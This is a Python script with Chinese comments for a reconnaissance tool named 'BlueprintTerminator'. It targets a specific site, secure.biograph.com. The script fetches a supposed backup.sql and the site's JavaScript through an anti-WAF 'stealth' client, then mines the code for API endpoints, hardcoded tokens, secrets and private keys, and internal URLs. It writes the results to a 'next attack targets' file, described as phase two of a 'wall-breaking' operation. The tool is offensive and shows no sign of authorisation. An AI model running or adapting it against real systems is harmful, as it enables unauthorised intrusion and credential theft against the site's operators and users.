import asyncio
import re
import json
import jsbeautifier
from datetime import datetime
from anti_waf_engine import StealthHTTPClient

class BlueprintTerminator:
    def __init__(self):
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.blueprint_url = "https://secure.biograph.com/backup.sql"
        self.base_url = "https://secure.biograph.com"
        self.js_files = []
        self.intelligence = {
            'api_endpoints': [],
            'hardcoded_credentials': [],
            'internal_info': [],
            'comments': [],
            'routes': [],
            'critical_findings': []
        }
    
    async def step1_extract_nervous_system(self):
        """第一步：提取神经系统(JavaScript文件URL)"""
        print("🧠 第一步：提取神经系统 (JavaScript文件URL)")
        print("=" * 60)
        
        async with StealthHTTPClient() as client:
            try:
                async with await client.get(self.blueprint_url, timeout=15) as response:
                    content = await response.read()
                    html_content = content.decode('utf-8', errors='ignore')
                    
                    print(f"📄 HTML蓝图大小: {len(html_content)}字符")
                    
                    # 提取<script src="...">标签
                    script_pattern = r'<script[^>]+src=["\']([^"\']+)["\'][^>]*>'
                    script_matches = re.findall(script_pattern, html_content, re.IGNORECASE)
                    
                    print(f"🔍 发现脚本引用: {len(script_matches)}个")
                    
                    for script_url in script_matches:
                        # 构建完整URL
                        if script_url.startswith('http'):
                            full_url = script_url
                            is_internal = 'biograph.com' in script_url
                        elif script_url.startswith('/'):
                            full_url = f"{self.base_url}{script_url}"
                            is_internal = True
                        else:
                            full_url = f"{self.base_url}/{script_url}"
                            is_internal = True
                        
                        js_info = {
                            'url': full_url,
                            'relative_path': script_url,
                            'is_internal': is_internal,
                            'priority': 'CRITICAL' if is_internal else 'MEDIUM',
                            'content': None,
                            'beautified_content': None
                        }
                        
                        self.js_files.append(js_info)
                        
                        priority_icon = "🔥" if is_internal else "🌐"
                        print(f"  {priority_icon} {script_url}")
                    
                    print(f"\n✅ 神经系统提取完成: {len(script_matches)}个JS文件")
                    return len(script_matches)
                    
            except Exception as e:
                print(f"❌ 神经系统提取失败: {e}")
                return 0
    
    async def step2_deobfuscate_beautify(self):
        """第二步：代码反混淆与美化"""
        print(f"\n🎨 第二步：代码反混淆与美化")
        print("=" * 60)
        
        async with StealthHTTPClient() as client:
            for i, js_file in enumerate(self.js_files):
                print(f"\n📥 下载 {i+1}/{len(self.js_files)}: {js_file['relative_path']}")
                
                try:
                    async with await client.get(js_file['url'], timeout=20) as response:
                        if response.status == 200:
                            content = await response.read()
                            js_content = content.decode('utf-8', errors='ignore')
                            
                            js_file['content'] = js_content
                            js_file['original_size'] = len(js_content)
                            
                            print(f"  📏 原始大小: {len(js_content)}字符")
                            
                            # JavaScript美化
                            try:
                                beautified = jsbeautifier.beautify(js_content)
                                js_file['beautified_content'] = beautified
                                js_file['beautified_size'] = len(beautified)
                                
                                print(f"  ✨ 美化完成: {len(beautified)}字符")
                                print(f"  📈 可读性提升: {len(beautified)/len(js_content):.1f}x")
                                
                            except Exception as e:
                                print(f"  ⚠️ 美化失败，使用原始内容: {e}")
                                js_file['beautified_content'] = js_content
                                js_file['beautified_size'] = len(js_content)
                        else:
                            print(f"  ❌ 下载失败: HTTP {response.status}")
                            
                except Exception as e:
                    print(f"  ❌ 下载异常: {e}")
                
                await asyncio.sleep(0.5)  # 避免过快请求
        
        successful_downloads = len([js for js in self.js_files if js.get('content')])
        print(f"\n✅ 代码美化完成: {successful_downloads}/{len(self.js_files)}个文件")
        return successful_downloads
    
    def step3_intelligence_mining(self):
        """第三步：源码情报挖掘"""
        print(f"\n🕵️ 第三步：源码情报挖掘")
        print("=" * 60)
        
        for js_file in self.js_files:
            if not js_file.get('beautified_content'):
                continue
                
            print(f"\n🔍 挖掘文件: {js_file['relative_path']}")
            js_content = js_file['beautified_content']
            
            # 最高优先级：API端点与路由
            self.mine_api_endpoints(js_content, js_file['relative_path'])
            
            # 高优先级：硬编码凭据
            self.mine_hardcoded_credentials(js_content, js_file['relative_path'])
            
            # 中优先级：内部信息
            self.mine_internal_info(js_content, js_file['relative_path'])
        
        # 汇总分析
        self.analyze_intelligence()
    
    def mine_api_endpoints(self, js_content, source_file):
        """挖掘API端点"""
        print("  🎯 挖掘API端点...")
        
        api_patterns = [
            (r'\/api\/[a-zA-Z0-9_\-\/]+', 'API路径'),
            (r'[\'\"]/[a-zA-Z0-9_\-/]+[\'"`]', 'URL路径'),
            (r'path:\s*[\'\"]/[^\'\"]+', '前端路由'),
            (r'endpoint:\s*[\'\"]/[^\'\"]+', '端点定义'),
            (r'baseURL:\s*[\'\"]/[^\'\"]+', '基础URL'),
            (r'apiUrl:\s*[\'\"]/[^\'\"]+', 'API URL'),
            (r'fetch\s*\(\s*[\'\"]/[^\'\"]+', 'Fetch调用'),
            (r'axios\.[a-z]+\s*\(\s*[\'\"]/[^\'\"]+', 'Axios调用')
        ]
        
        for pattern, pattern_name in api_patterns:
            matches = re.findall(pattern, js_content, re.IGNORECASE)
            for match in matches:
                # 清理匹配结果
                clean_match = match.strip('\'"` ')
                if len(clean_match) > 3 and clean_match not in [e['endpoint'] for e in self.intelligence['api_endpoints']]:
                    endpoint_info = {
                        'endpoint': clean_match,
                        'type': pattern_name,
                        'source_file': source_file,
                        'full_url': f"{self.base_url}{clean_match}" if clean_match.startswith('/') else clean_match
                    }
                    self.intelligence['api_endpoints'].append(endpoint_info)
                    print(f"    🎯 {pattern_name}: {clean_match}")
    
    def mine_hardcoded_credentials(self, js_content, source_file):
        """挖掘硬编码凭据"""
        print("  🔑 挖掘硬编码凭据...")
        
        credential_patterns = [
            (r'(api_key|secret|token|auth|password)[\'\"]\s*[:=]\s*[\'\"]([ -~]{16,})', '密钥'),
            (r'Bearer\s+([a-zA-Z0-9\._\-]{20,})', 'Bearer令牌'),
            (r'Authorization:\s*[\'\"]([ -~]{20,})', '授权头'),
            (r'access_token[\'\"]\s*[:=]\s*[\'\"]([ -~]{20,})', '访问令牌'),
            (r'client_secret[\'\"]\s*[:=]\s*[\'\"]([ -~]{20,})', '客户端密钥'),
            (r'private_key[\'\"]\s*[:=]\s*[\'\"]([ -~]{30,})', '私钥')
        ]
        
        for pattern, cred_type in credential_patterns:
            matches = re.findall(pattern, js_content, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    key_name, key_value = match
                    credential_info = {
                        'type': cred_type,
                        'key_name': key_name,
                        'key_value': key_value[:20] + "..." if len(key_value) > 20 else key_value,
                        'full_key': key_value,
                        'source_file': source_file,
                        'risk': 'CRITICAL'
                    }
                else:
                    credential_info = {
                        'type': cred_type,
                        'key_value': match[:20] + "..." if len(match) > 20 else match,
                        'full_key': match,
                        'source_file': source_file,
                        'risk': 'CRITICAL'
                    }
                
                self.intelligence['hardcoded_credentials'].append(credential_info)
                print(f"    🚨 {cred_type}: {credential_info['key_value']}")
    
    def mine_internal_info(self, js_content, source_file):
        """挖掘内部信息"""
        print("  🏠 挖掘内部信息...")
        
        # 代码注释
        comment_patterns = [
            r'\/\/[^\n]*',
            r'\/\*[\s\S]*?\*\/'
        ]
        
        for pattern in comment_patterns:
            comments = re.findall(pattern, js_content)
            for comment in comments:
                comment_clean = comment.strip('/* \t\n/')
                if len(comment_clean) > 5:
                    comment_info = {
                        'content': comment_clean,
                        'source_file': source_file
                    }
                    self.intelligence['comments'].append(comment_info)
                    if len(comment_clean) > 20:  # 只显示较长的注释
                        print(f"    💬 注释: {comment_clean[:50]}...")
        
        # 内部URL
        internal_patterns = [
            r'https?://[a-zA-Z0-9\.-]+\.internal[^\'\")\s]*',
            r'https?://[a-zA-Z0-9\.-]+\.biograph\.com[^\'\")\s]*',
            r'localhost:[0-9]+[^\'\")\s]*',
            r'127\.0\.0\.1:[0-9]+[^\'\")\s]*'
        ]
        
        for pattern in internal_patterns:
            matches = re.findall(pattern, js_content)
            for match in matches:
                internal_info = {
                    'url': match,
                    'type': 'internal_url',
                    'source_file': source_file
                }
                self.intelligence['internal_info'].append(internal_info)
                print(f"    🌐 内部URL: {match}")
    
    def analyze_intelligence(self):
        """分析情报"""
        print(f"\n🧠 情报分析汇总")
        print("=" * 60)
        
        # 统计发现
        api_count = len(self.intelligence['api_endpoints'])
        cred_count = len(self.intelligence['hardcoded_credentials'])
        internal_count = len(self.intelligence['internal_info'])
        comment_count = len(self.intelligence['comments'])
        
        print(f"🎯 API端点: {api_count}个")
        print(f"🔑 硬编码凭据: {cred_count}个")
        print(f"🏠 内部信息: {internal_count}个")
        print(f"💬 代码注释: {comment_count}条")
        
        # 关键发现分析
        if cred_count > 0:
            self.intelligence['critical_findings'].append(f"发现{cred_count}个硬编码凭据")
            print(f"🚨 关键发现: 硬编码凭据泄露!")
        
        # 高价值API端点
        high_value_apis = []
        for endpoint in self.intelligence['api_endpoints']:
            ep = endpoint['endpoint'].lower()
            if any(keyword in ep for keyword in ['admin', 'login', 'auth', 'user', 'manage', 'config']):
                high_value_apis.append(endpoint)
        
        if high_value_apis:
            self.intelligence['critical_findings'].append(f"发现{len(high_value_apis)}个高价值API端点")
            print(f"🎉 高价值API端点: {len(high_value_apis)}个")
            for api in high_value_apis[:5]:  # 显示前5个
                print(f"  • {api['endpoint']}")
        
        # 生成下一阶段攻击目标
        self.generate_attack_targets()
    
    def generate_attack_targets(self):
        """生成下一阶段攻击目标"""
        print(f"\n⚔️ 生成下一阶段攻击目标")
        print("=" * 60)
        
        # 高优先级目标
        high_priority_targets = []
        
        # API端点
        for endpoint in self.intelligence['api_endpoints']:
            ep = endpoint['endpoint'].lower()
            priority = 'CRITICAL'
            
            if any(keyword in ep for keyword in ['admin', 'login', 'auth', 'manage']):
                priority = 'CRITICAL'
            elif any(keyword in ep for keyword in ['api', 'user', 'data']):
                priority = 'HIGH'
            else:
                priority = 'MEDIUM'
            
            target = {
                'url': endpoint['full_url'],
                'type': 'api_endpoint',
                'priority': priority,
                'source': endpoint['source_file']
            }
            high_priority_targets.append(target)
        
        # 按优先级排序
        high_priority_targets.sort(key=lambda x: {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2}[x['priority']])
        
        # 保存攻击目标
        targets_file = f"next_attack_targets_{self.session_id}.txt"
        with open(targets_file, 'w') as f:
            for target in high_priority_targets:
                f.write(f"{target['url']}\n")
        
        print(f"📄 攻击目标文件: {targets_file}")
        print(f"🎯 总目标数: {len(high_priority_targets)}")
        
        # 显示前10个关键目标
        print(f"\n🔥 前10个关键目标:")
        for i, target in enumerate(high_priority_targets[:10]):
            priority_icon = "🚨" if target['priority'] == 'CRITICAL' else "🔥" if target['priority'] == 'HIGH' else "⚡"
            print(f"  {i+1:2d}. {priority_icon} {target['url']}")
        
        return targets_file
    
    def generate_report(self):
        """生成完整报告"""
        report = {
            'session_id': self.session_id,
            'analysis_time': datetime.now().isoformat(),
            'js_files': self.js_files,
            'intelligence': self.intelligence,
            'summary': {
                'total_js_files': len(self.js_files),
                'successful_downloads': len([js for js in self.js_files if js.get('content')]),
                'api_endpoints_found': len(self.intelligence['api_endpoints']),
                'hardcoded_credentials': len(self.intelligence['hardcoded_credentials']),
                'critical_findings': len(self.intelligence['critical_findings'])
            }
        }
        
        report_file = f"blueprint_termination_{self.session_id}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        return report_file
    
    async def execute_termination(self):
        """执行完整的蓝图终极解剖"""
        print("🔥 蓝图终极解剖器启动 - '破壁'行动第二阶段")
        print("🎯 目标: 从HTML蓝图中榨取真实API端点")
        print("=" * 80)
        
        # 第一步：提取神经系统
        js_count = await self.step1_extract_nervous_system()
        if js_count == 0:
            print("❌ 未发现JavaScript文件，终止操作")
            return None
        
        # 第二步：代码美化
        success_count = await self.step2_deobfuscate_beautify()
        if success_count == 0:
            print("❌ 无法下载JavaScript文件，终止操作")
            return None
        
        # 第三步：情报挖掘
        self.step3_intelligence_mining()
        
        # 生成报告
        report_file = self.generate_report()
        
        print(f"\n🎉 '破壁'行动第二阶段完成!")
        print(f"📄 详细报告: {report_file}")
        
        return report_file

async def main():
    terminator = BlueprintTerminator()
    await terminator.execute_termination()

if __name__ == "__main__":
    asyncio.run(main()) 